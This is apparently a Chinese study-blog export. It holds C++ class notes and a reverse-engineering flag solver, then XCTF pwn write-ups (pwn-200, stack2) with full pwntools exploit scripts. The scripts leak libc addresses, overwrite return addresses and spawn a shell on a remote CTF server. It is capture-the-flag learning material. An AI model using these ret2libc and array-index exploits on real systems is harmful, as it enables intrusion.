<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span><span class="comment">//关键字class专门用来定义类，Student是类的名称，类名首字母一般大写</span></span><br><span class="line"><span class="keyword">public</span>:<span class="comment">//表示类的成员具有公开的访问权限，其他还有private等</span></span><br><span class="line">    <span class="comment">//成员变量</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">float</span> score;</span><br><span class="line">    <span class="comment">//成员函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;name&lt;&lt;<span class="string">"的年龄是"</span>&lt;&lt;age&lt;&lt;<span class="string">"，成绩是"</span>&lt;&lt;score&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="title">LLL</span>;</span><span class="comment">//创建对象 ，class可不要，LLL也可为数组</span></span><br><span class="line"><span class="comment">// 用.访问成员</span></span><br><span class="line"><span class="comment">//与结构体贼相似</span></span><br></pre></td></tr></table></figure>
<h3 id="对象指针"><a href="#对象指针" class="headerlink" title="对象指针"></a>对象指针</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在栈上分配内存</span></span><br><span class="line">Student stu;</span><br><span class="line">Student *pStu = &amp;stu;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在堆上分配内存</span></span><br><span class="line">Student *pStu = <span class="keyword">new</span> Student;</span><br><span class="line"><span class="comment">//访问时通过"-&gt;"</span></span><br></pre></td></tr></table></figure>
<h3 id="成员变量和成员函数"><a href="#成员变量和成员函数" class="headerlink" title="成员变量和成员函数"></a>成员变量和成员函数</h3><p>在类中直接定义函数时，不需要在函数名前加类名；当成员函数定义在类外时，要在函数名前加类名<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">float</span> score;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>;  <span class="comment">//函数声明</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Student::say</span><span class="params">()</span></span>&#123;<span class="comment">// 如果写成inline void Student::say 就为内联函数</span></span><br><span class="line">    <span class="comment">//::是域解析符（作用域运算符、作用域限定符）用来连接类名和函数名</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;name&lt;&lt;<span class="string">"的年龄是"</span>&lt;&lt;age&lt;&lt;<span class="string">"，成绩是"</span>&lt;&lt;score;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><strong>在类体中定义的成员函数会自动成为内联函数，在类体外定义的不会</strong><br>内联函数会将函数调用处用函数体代替，所以尽量在类内部作声明，在类外对函数定义   </p>
<blockquote>
<p>函数调用是有时间和空间开销的。程序在执行一个函数之前需要将实参、局部变量、返回地址以及若干寄存器都压入栈中，然后才能执行函数体中的代码；执行完之后，还要将之前压入栈中的数据都出栈，才能接着执行函数调用位置以后的代码。<br>如果函数体代码比较多，需要较长的执行时间，那么函数调用机制占用的时间可以忽略；如果函数只有一两句语句，那么大部分的时间都会花费在函数调用机制上，这种时间开销就不容忽视。<br>为了消除函数调用的时空开销，C++在编译时将函数调用处用函数体替换，即内联函数。<br>内联函数的缺点：编译后的程序会存在多份相同的函数拷贝。<br>内联函数的代码在编译后就被消除了</p>
</blockquote>
<h3 id="类成员的访问权限和类的封装"><a href="#类成员的访问权限和类的封装" class="headerlink" title="类成员的访问权限和类的封装"></a>类成员的访问权限和类的封装</h3><p>控制成员的访问权限：成员访问限定符public、protected、private<br>在类的内部，成员可以互相访问；在类的外部，只能通过对象访问public属性的成员<br>约定成员变量以<em>m_</em>开头，可以直接看出是成员变量，又可以和成员函数中的形参名字区分<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:  <span class="comment">//私有的</span></span><br><span class="line">    <span class="keyword">char</span> *m_name;</span><br><span class="line">    <span class="keyword">float</span> m_score;</span><br><span class="line"><span class="keyword">public</span>:  <span class="comment">//共有的</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setname</span><span class="params">(<span class="keyword">char</span> *name)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setscore</span><span class="params">(<span class="keyword">float</span> score)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Student::setname</span><span class="params">(<span class="keyword">char</span> *name)</span></span>&#123;</span><br><span class="line">    m_name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Student::setscore</span><span class="params">(<span class="keyword">float</span> score)</span></span>&#123;</span><br><span class="line">    m_score = score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//在栈上创建对象</span></span><br><span class="line">    Student stu;</span><br><span class="line">    stu.setname(<span class="string">"小明"</span>);</span><br><span class="line">    stu.setscore(<span class="number">92.5f</span>);</span><br><span class="line">    <span class="comment">//在堆上创建对象</span></span><br><span class="line">    Student *pstu = <span class="keyword">new</span> Student;</span><br><span class="line">    pstu -&gt; setname(<span class="string">"李华"</span>);</span><br><span class="line">    pstu -&gt; setscore(<span class="number">96</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>下面的写法是错误的<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">stu.m_name = <span class="string">"小明"</span>;</span><br><span class="line">stu.m_score = <span class="number">92.5f</span>;</span><br><span class="line">stu.show();</span><br></pre></td></tr></table></figure><br>因为私有的成员变量不能通过对象直接访问，必须借助public属性的成员函数来修改</p>
<h4 id="类的封装"><a href="#类的封装" class="headerlink" title="类的封装"></a>类的封装</h4><p>private：作用在于更好的隐藏内部的实现，不希望外部知道或只在内部使用的成员声明为private<br>public：向外部暴露的接口声明为public//如上面的setname()和setscore()<br>（实际项目开发中，成员变量都建议声明为private，只将允许通过对象对用的成员函数声明为public）<br>protected：在类外也不能通过对象访问，但在派生类内部可以访问</p>
<blockquote>
<p>给成员变量赋值的函数通常以set开头；读取成员变量的值的函数通常以get开头</p>
</blockquote>
<p>private 和 public的使用体现了类的封装性，即：尽量隐藏类的内部实现，只向用户提供有用的成员函数。   </p>
<h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><p>一种特殊的成员函数，名称与类名完全相同，可用于对某些成员变量设置初始值。创建对象时系统会自动调用构造函数进行初始化工作<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Line::Line( <span class="keyword">double</span> len，<span class="keyword">int</span> age, <span class="keyword">float</span> score): length(len)<span class="comment">//构造函数，也可以对多个成员变量进行赋值</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//相当于</span></span><br><span class="line">Line::Line( <span class="keyword">double</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    length = len;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="初始化const成员变量"><a href="#初始化const成员变量" class="headerlink" title="初始化const成员变量"></a>初始化const成员变量</h4><p>如：对下面m_len的初始化<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VLA</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> m_len;</span><br><span class="line">    <span class="keyword">int</span> *m_arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    VLA(<span class="keyword">int</span> len);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>只能使用<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">VLA::VLA(<span class="keyword">int</span> len):m_len(len)&#123;</span><br><span class="line">    m_arr=<span class="keyword">new</span> <span class="keyword">int</span>[len]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//而不能：</span></span><br><span class="line">VLA::VLA(<span class="keyword">int</span> len)&#123;</span><br><span class="line">    m_len = len;</span><br><span class="line">    m_arr = <span class="keyword">new</span> <span class="keyword">int</span>[len];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="堆和栈的区别"><a href="#堆和栈的区别" class="headerlink" title="堆和栈的区别"></a>堆和栈的区别</h1><ol>
<li>内存分配<br>堆由程序员分配和释放；栈由编译器自动分配   </li>
<li>申请方式<br>堆：用malloc、new申请；栈：如int a</li>
<li>大小限制<br>堆：向高地址扩展，用不连续的内存空间存储。大小受到系统虚拟内存大小的限制，因此获得的空间比较大<br>栈：向低地址扩展，一块连续的内存空间。栈的大小是固定的，能申请的空间比较小</li>
<li>效率<br>堆：速度慢，容易产生内存碎片<br>栈：系统分配，速度快<h1 id="攻防世界逆向题"><a href="#攻防世界逆向题" class="headerlink" title="攻防世界逆向题"></a>攻防世界逆向题</h1><h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2>首先放到ida里看伪代码<br><img src="https://s1.ax1x.com/2020/05/24/tSSEUs.png" alt="tSSEUs.png"><br>其中<br>t存放的是“SharifCTF{????????????????????????????????}”<br>u存放的是“<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>*</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>”<br>s存放的是“c61b68366edeb7bdce3c6820314b7498”<br>并且s的长度和t里的?一样；“SharifCTF{”长度为10<br>整段伪代码大概就是：<br>先改变t里每个?的值，然后输出到文件，然后再改变整个t，再输出一次，最后把这个文件删了<br><img src="https://s1.ax1x.com/2020/05/24/tSSAEj.png" alt="tSSAEj.png"><br>在第一次输出时伪代码是：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(stream, <span class="string">"%s\n"</span>, u, v5);</span><br></pre></td></tr></table></figure>
只有一个%s，看起来只输出了u，并没有输出v5    </li>
</ol>
<p>在第二次输出时用到了fseek(),其作用是将文件的指针移动：<br><img src="https://s1.ax1x.com/2020/05/24/tSSwrD.png" alt="tSSwrD.png">   </p>
<p>由于u的内容一直都是”<em>..<em>**</em>…</em>“，那么也就是说存放flag的t被最后一个循环覆盖为了一堆 *<br>综上，flag应该出现在第一次输出时的t里，得到flag的过程为程序的第一个循环，可以得到代码如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">50</span>]=<span class="string">"c61b68366edeb7bdce3c6820314b7498"</span>;</span><br><span class="line">	<span class="keyword">int</span> v=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> v3;</span><br><span class="line">	<span class="keyword">char</span> t[<span class="number">50</span>]=<span class="string">"SharifCTF&#123;????????????????????????????????&#125;"</span>; </span><br><span class="line">	<span class="keyword">while</span>((<span class="keyword">signed</span> <span class="keyword">int</span> )v&lt;<span class="built_in">strlen</span>(s))&#123;</span><br><span class="line">		<span class="keyword">if</span>(v&amp;<span class="number">1</span>)</span><br><span class="line">			v3=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			v3=<span class="number">-1</span>;</span><br><span class="line">		*(t+(<span class="keyword">signed</span> <span class="keyword">int</span>)v+<span class="number">10</span>)=s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v]+v3;</span><br><span class="line">		<span class="comment">//从&#123;后面开始修改数组t的内容 </span></span><br><span class="line">		v=v+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(t);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>加密与解密</tag>
        <tag>CTF</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>xctf栈溢出WP（1）</title>
    <url>/51845.html</url>
    <content><![CDATA[<a id="more"></a>
<h2 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn-200"></a>pwn-200</h2><p>写这题的时候有半个多月没有接触栈溢出了…算是拿这题复习一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec b</span><br><span class="line">[*] <span class="string">'/home/pluto/Desktop/b'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>用ROPgadget搜索没有发现system和/bin/sh，于是猜到大概是要ret2libc</p>
<p>ida打开，程序很简单:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+2Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+30h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+34h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+38h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+3Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+44h] [ebp-54h]</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="number">1668048215</span>;</span><br><span class="line">  v2 = <span class="number">543518063</span>;</span><br><span class="line">  v3 = <span class="number">1478520692</span>;</span><br><span class="line">  v4 = <span class="number">1179927364</span>;</span><br><span class="line">  v5 = <span class="number">892416050</span>;</span><br><span class="line">  v6 = <span class="number">663934</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v7, <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, (<span class="keyword">char</span> *)&amp;buf);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, &amp;buf, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf));</span><br><span class="line">  sub_8048484();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_8048484</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">256u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现sub_8048484()存在栈溢出</p>
<p>复习一下找libc版本—&gt;getshell的步骤：</p>
<ol>
<li>用puts、write、printf之类的函数打印出某个函数的got，同时要控制好打印后的返回地址</li>
<li>获得libc的版本、system函数，/bin/sh的地址等，并计算在plt中的位置</li>
<li>构造payload</li>
</ol>
<p>这题我们使用write()打印出write.got：<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">addr_out = <span class="string">'a'</span>*<span class="number">112</span> + p32(write_plt) + p32(<span class="number">0x080483D0</span>) + p32(<span class="number">1</span>) + p32(write_got) +p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#1+write_got+4==write(..,..,..)</span></span><br><span class="line"><span class="comment">#返回地址为程序入口地址</span></span><br><span class="line">p.sendlineafter(<span class="string">'\n'</span>, addr_out)</span><br><span class="line">a = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">write_got_addr =  a</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(write_got_addr)</span><br></pre></td></tr></table></figure><br>这里提示一下，“p32(1) + p32(write_got) +p32(4)”构造的是一个write函数的参数，之前看别人的wp想了好久1和4是啥…太蠢了</p>
<p>用低12位搜索libc的时候注意，查看的是16进制的地址，别再在这卡一个晚上了…将地址和偏移地址进行计算的时候不用转成16进制（str和int的问题）</p>
<p>后续的代码：<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">write_off = <span class="number">0x0d43c0</span></span><br><span class="line">sys_off = <span class="number">0x03a940</span></span><br><span class="line">binsh_off = <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line">base = write_got_addr - write_off</span><br><span class="line">sys = sys_off + base</span><br><span class="line">binsh = binsh_off + base</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">112</span> + p32(sys) + p32(<span class="number">1</span>) + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><br>这个payload比较简短，看到另一种做法如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一次结束后返回start的地址</span></span><br><span class="line"></span><br><span class="line">ppp_addr=<span class="number">0x0804856c</span></span><br><span class="line"><span class="comment">#三次pop指令的地址</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">payload2 =<span class="string">'A'</span>*junk+p32(read_plt)+p32(ppp_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress</span></span><br><span class="line"><span class="comment">#read(0,bss_addr,8)把'/bin/sh'读到bss段上，因为bss段可执行</span></span><br><span class="line">payload2+=p32(sys_addr)+p32(func_addr)+p32(bss_addr)</span><br><span class="line"><span class="comment">#用三次pop把指针指向了systemAddress，此时调用system()函数，再栈溢出把bss段上的内容('/bin/sh')当作参数传给system()调用</span></span><br><span class="line">r.send(payload2)</span><br><span class="line">r.send(<span class="string">'/bin/sh'</span>)</span><br></pre></td></tr></table></figure>
<p>思路值得学习</p>
<h2 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h2><p>首先checksec：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec stack2</span><br><span class="line">[*] <span class="string">'/home/pluto/Desktop/stack2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><br>32位程序，嗯 回忆一下传参方式，是直接放在函数后面，没有用到寄存器的<br>看到有栈溢出保护，似乎先要泄露canary，继续。</p>
<p>程序很简单，修饰一些变量名后如下(忽略无关语句)：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> stack_size; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> choose; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> number[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> canary; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//blah blah blah</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many numbers you have:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;stack_size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me your numbers"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; stack_size &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    number[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = stack_size; ; <span class="built_in">printf</span>(<span class="string">"average is %.2lf\n"</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;choose);</span><br><span class="line">          <span class="keyword">if</span> ( choose != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Give me your number"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">99</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            number[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( choose &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( choose != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"id\t\tnumber"</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%d\t\t%d\n"</span>, k, number[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( choose != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;stack_size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      number[stack_size] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choose != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += number[l];</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="comment">//无力吐槽f5出的代码，不过...能看就行</span></span><br></pre></td></tr></table></figure><br>可以发现在选择3时，没有对输入的stack_size进行判断，所以可以更改栈中任意地址内容的，而且不会被canary发现。<br>再看程序的函数，发现有system()和一个“hackhere”函数，直接返回了system(“/bin/sh”)（这是一个陷阱，在远程环境里没有用bash，而是使用了sh，但这个函数也提供了sh这个字符串）</p>
<p>所以现在的思路就是，通过choose=3，构造函数的返回地址为system的plt和参数，这就需要找到number这个数组的起始位置和返回地址的偏移量<br>看ida，似乎偏移是0x74，但是究竟是不是呢？还是通过gdb验证一下吧</p>
<p>我们先把断点断在第一次向number数组输入的时候。此时写入的地址即为数组的首地址<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207210639.png" alt="20201207210639"><br>（前面输入的内容都为1）</p>
<p>执行前：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">EAX  0xffffcf18 ◂— 0xe0</span><br></pre></td></tr></table></figure><br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207211134.png" alt="20201207211134"></p>
<p>执行后：<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207211413.png" alt="20201207211413"></p>
<p>所以首地址在cf18的位置，查看此时栈帧<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207211929.png" alt="20201207211929"><br>所以偏移为：cf9c-cf18==0x84<br>(ida错了！！！)</p>
<p>因此可以易得exp了：<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p = process("./stack2")</span></span><br><span class="line">p = remote(<span class="string">"220.249.52.133"</span>, <span class="number">53339</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"numbers\n"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">	addr = str(addr)</span><br><span class="line">	data = str(data)</span><br><span class="line">	p.sendlineafter(<span class="string">"exit\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"change:\n"</span>,addr)</span><br><span class="line">	p.sendlineafter(<span class="string">"number:\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys: 0x08048450</span></span><br><span class="line">change(<span class="number">0x84</span>, <span class="number">0x50</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">1</span>,<span class="number">0x84</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line"><span class="comment">#sh: 0x08048987</span></span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>,<span class="number">0x87</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">1</span>,<span class="number">0x89</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"exit\n"</span>,<span class="string">"5"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><br>getshell</p>
